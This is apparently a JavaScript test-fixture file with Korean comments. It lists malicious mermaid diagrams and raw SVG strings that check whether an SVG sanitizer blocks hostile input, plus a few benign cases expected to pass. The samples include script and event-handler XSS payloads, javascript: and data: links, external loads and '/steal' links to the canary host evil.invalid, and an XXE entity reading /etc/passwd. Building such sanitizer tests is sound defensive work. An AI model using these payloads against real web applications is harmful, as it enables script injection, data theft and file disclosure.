#!/usr/bin/env node
// #179 독립 검증 — 악성 샘플 정의.
// A) appPath: mermaid 코드 → 실제 앱 경로(Explanation → renderPeleDiagram → sanitizePeleSvg).
// B) sanitizeCases: 원시 SVG → sanitizer 직접 경계(sanitizePeleSvg).
// 외부 요청 시도는 전부 canary 호스트(evil.invalid)로 향하게 한다.

const EVIL = 'https://evil.invalid';

/** A) 앱 경로 악성 mermaid 샘플 — 라벨·링크·지시문에 페이로드를 넣는다. */
export const appPathSamples = [
  { id: 'a01-script-tag', code: `flowchart LR\n  A["<script>window.__pwned=(window.__pwned||0)+1</script>"] --> B` },
  { id: 'a02-script-src', code: `flowchart LR\n  A["<script src='${EVIL}/x.js'></script>"] --> B` },
  { id: 'a03-img-onerror', code: `flowchart LR\n  A["<img src=x onerror='window.__pwned=(window.__pwned||0)+1'>"] --> B` },
  { id: 'a04-img-external', code: `flowchart LR\n  A["<img src='${EVIL}/x.png'>"] --> B` },
  { id: 'a05-img-network-path', code: `flowchart LR\n  A["<img src='//evil.invalid/x.png'>"] --> B` },
  { id: 'a06-iframe', code: `flowchart LR\n  A["<iframe src='${EVIL}/x'></iframe>"] --> B` },
  { id: 'a07-iframe-js', code: `flowchart LR\n  A["<iframe src='javascript:window.__pwned=(window.__pwned||0)+1'></iframe>"] --> B` },
  { id: 'a08-foreign-object', code: `flowchart LR\n  A["<foreignObject><body onload='window.__pwned=(window.__pwned||0)+1'></body></foreignObject>"] --> B` },
  { id: 'a09-svg-onload', code: `flowchart LR\n  A["<svg onload='window.__pwned=(window.__pwned||0)+1'></svg>"] --> B` },
  { id: 'a10-object-embed', code: `flowchart LR\n  A["<object data='${EVIL}/x'></object><embed src='${EVIL}/y'>"] --> B` },
  { id: 'a11-style-import', code: `flowchart LR\n  A["<style>@import url('${EVIL}/x.css');</style>"] --> B` },
  { id: 'a12-style-bg-url', code: `flowchart LR\n  A["<div style='background:url(${EVIL}/x)'>z</div>"] --> B` },
  { id: 'a13-link-javascript', code: `flowchart LR\n  A --> B\n  click A "javascript:window.__pwned=(window.__pwned||0)+1"` },
  { id: 'a14-link-external', code: `flowchart LR\n  A --> B\n  click A "${EVIL}/steal"` },
  { id: 'a15-link-network-path', code: `flowchart LR\n  A --> B\n  click A "//evil.invalid/steal"` },
  { id: 'a16-link-data-url', code: `flowchart LR\n  A --> B\n  click A "data:text/html,<script>window.__pwned=(window.__pwned||0)+1</script>"` },
  { id: 'a17-base-tag', code: `flowchart LR\n  A["<base href='${EVIL}/'>"] --> B` },
  { id: 'a18-meta-refresh', code: `flowchart LR\n  A["<meta http-equiv='refresh' content='0;url=${EVIL}/'>"] --> B` },
  { id: 'a19-link-stylesheet', code: `flowchart LR\n  A["<link rel='stylesheet' href='${EVIL}/x.css'>"] --> B` },
  { id: 'a20-body-onload', code: `flowchart LR\n  A["<body onload='window.__pwned=(window.__pwned||0)+1'>"] --> B` },
  { id: 'a21-svg-use-xlink', code: `flowchart LR\n  A["<use xlink:href='${EVIL}/x.svg#i'></use>"] --> B` },
  { id: 'a22-svg-image-href', code: `flowchart LR\n  A["<image href='${EVIL}/x.png'></image>"] --> B` },
  { id: 'a23-anchor-xlink-js', code: `flowchart LR\n  A["<a xlink:href='javascript:window.__pwned=(window.__pwned||0)+1'>x</a>"] --> B` },
  { id: 'a24-textarea-break', code: `flowchart LR\n  A["</textarea><script>window.__pwned=(window.__pwned||0)+1</script>"] --> B` },
  { id: 'a25-init-directive', code: `%%{init: {"theme": "dark", "htmlLabels": true}}%%\nflowchart LR\n  A --> B` },
  { id: 'a26-form-action', code: `flowchart LR\n  A["<form action='${EVIL}/x'><input name='pw' type='password'></form>"] --> B` },
  { id: 'a27-invalid-syntax', code: `flowchart LR\n  A[[[ --> B\n  C ===` },
  { id: 'a28-unsupported-type', code: `sankey-beta\n  A,B,10\n  B,C,5` },
  { id: 'a29-entity-entity', code: `flowchart LR\n  A["&lt;script&gt;"] --> B` },
  { id: 'a30-long-korean', code: `flowchart LR\n  A["AWS Elastic Load BalancingApplication Load Balancer경유하여Service내부의다중인스턴스로트래픽을분산하는구성"] --> B` },
];

const SVG = (inner, attrs = '') =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100"${attrs}>${inner}</svg>`;

/** B) sanitizer 직접 경계 — expect 'block'은 null 반환, 'allow'는 통과 기대. */
export const sanitizeCases = [
  { id: 'b01-script', expect: 'block', svg: SVG('<script>window.__pwned=(window.__pwned||0)+1</script>') },
  { id: 'b02-onload', expect: 'block', svg: SVG('<g onload="window.__pwned=(window.__pwned||0)+1"><rect width="10" height="10"/></g>') },
  { id: 'b03-onclick', expect: 'block', svg: SVG('<g onclick="alert(1)"><rect width="10" height="10"/></g>') },
  { id: 'b04-foreign-object', expect: 'block', svg: SVG('<foreignObject><body onload="alert(1)"/></foreignObject>') },
  { id: 'b05-iframe', expect: 'block', svg: SVG('<iframe src="https://evil.invalid/x"></iframe>') },
  { id: 'b06-image', expect: 'block', svg: SVG('<image href="https://evil.invalid/x.png"/>') },
  { id: 'b07-use-external', expect: 'block', svg: SVG('<use href="https://evil.invalid/x.svg#i"/>') },
  { id: 'b08-use-xlink-external', expect: 'block', svg: SVG('<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://evil.invalid/x.svg#i"/>') },
  { id: 'b09-xlink-javascript', expect: 'block', svg: SVG('<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><text>x</text></a>') },
  { id: 'b10-href-https', expect: 'block', svg: SVG('<a href="https://evil.invalid/x"><text>x</text></a>') },
  { id: 'b11-href-network-path', expect: 'block', svg: SVG('<a href="//evil.invalid/x"><text>x</text></a>') },
  { id: 'b12-href-data-url', expect: 'block', svg: SVG('<a href="data:text/html,<script>alert(1)</script>"><text>x</text></a>') },
  { id: 'b13-paint-url-external', expect: 'block', svg: SVG('<g><rect width="10" height="10" fill="url(https://evil.invalid/x)"/></g>') },
  { id: 'b14-style-url-external', expect: 'block', svg: SVG('<g style="background:url(https://evil.invalid/x)"><rect width="10" height="10"/></g>') },
  { id: 'b15-style-expression', expect: 'block', svg: SVG('<g style="width:expression(alert(1))"><rect width="10" height="10"/></g>') },
  { id: 'b16-style-import', expect: 'block', svg: SVG('<g style="@import url(https://evil.invalid/x.css)"><rect width="10" height="10"/></g>') },
  { id: 'b17-style-behavior', expect: 'block', svg: SVG('<g style="behavior:url(#x)"><rect width="10" height="10"/></g>') },
  { id: 'b18-doctype', expect: 'block', svg: `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">${SVG('<rect width="10" height="10"/>')}` },
  { id: 'b19-processing-instruction', expect: 'block', svg: `<?xml-stylesheet href="https://evil.invalid/x.css"?>${SVG('<rect width="10" height="10"/>')}` },
  { id: 'b20-invalid-xml', expect: 'block', svg: '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10"</svg>' },
  { id: 'b21-not-svg-root', expect: 'block', svg: '<div xmlns="http://www.w3.org/2000/svg">x</div>' },
  { id: 'b22-wrong-namespace', expect: 'block', svg: '<svg xmlns="http://www.w3.org/1999/xhtml"><rect/></svg>' },
  { id: 'b23-foreign-namespace-child', expect: 'block', svg: SVG('<g xmlns="http://www.w3.org/1999/xhtml"><rect/></g>') },
  { id: 'b24-disallowed-element', expect: 'block', svg: SVG('<animate attributeName="href" to="javascript:alert(1)"/>') },
  { id: 'b25-disallowed-attr', expect: 'block', svg: SVG('<rect width="10" height="10" onfocus="alert(1)" tabindex="1"/>') },
  { id: 'b26-entity-xxe', expect: 'block', svg: `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>${SVG('<text>&xxe;</text>')}` },
  { id: 'b27-paint-url-malformed', expect: 'block', svg: SVG('<g><rect width="10" height="10" fill="url(https://evil.invalid/x"/></g>') },
  { id: 'b28-href-backslash', expect: 'block', svg: SVG('<a href="\\\\evil.invalid/x"><text>x</text></a>') },
  { id: 'b29-image-in-allowed', expect: 'block', svg: SVG('<g><image href="#local"/></g>') },
  { id: 'b30-style-js-url', expect: 'block', svg: SVG('<g style="background:url(javascript:alert(1))"><rect width="10" height="10"/></g>') },
  // 허용 케이스 (오탐(false positive) 회귀)
  { id: 'c01-internal-fragment', expect: 'allow', note: '내부 fragment paint 마커 허용(요구사항)', svg: SVG('<g><rect width="10" height="10" fill="url(#grad)"/></g>') },
  { id: 'c02-internal-href', expect: 'allow', svg: SVG('<a href="#local"><text>x</text></a>') },
  { id: 'c03-title-desc', expect: 'allow', svg: SVG('<title id="t">제목</title><desc id="d">설명</desc><rect width="10" height="10"/>') },
  { id: 'c04-aria', expect: 'allow', svg: SVG('<g role="img" aria-label="다이어그램"><rect width="10" height="10"/></g>') },
  { id: 'c05-data-attr', expect: 'allow', svg: SVG('<g data-testid="x"><rect width="10" height="10"/></g>') },
  { id: 'c06-clip-path', expect: 'allow', note: 'clip-path 속성은 허용목록에 없음(허용목록 관찰용)', svg: SVG('<defs><clipPath id="c"><rect width="10" height="10"/></clipPath></defs><g clip-path="url(#c)"><rect width="10" height="10"/></g>') },
  { id: 'c07-text-tspan', expect: 'allow', svg: SVG('<g><text x="1" y="2"><tspan>한국어 텍스트</tspan></text></g>') },
  { id: 'c08-polyline-marker', expect: 'allow', note: 'marker-end 속성은 허용목록에 없음(허용목록 관찰용)', svg: SVG('<defs><marker id="m"><circle r="2"/></marker></defs><polyline points="0,0 10,10" marker-end="url(#m)"/>') },
];

if (import.meta.url === `file://${process.argv[1]}`) {
  console.log(`appPath 샘플 ${appPathSamples.length}종 / sanitizer 직접 경계 ${sanitizeCases.length}종`);
}
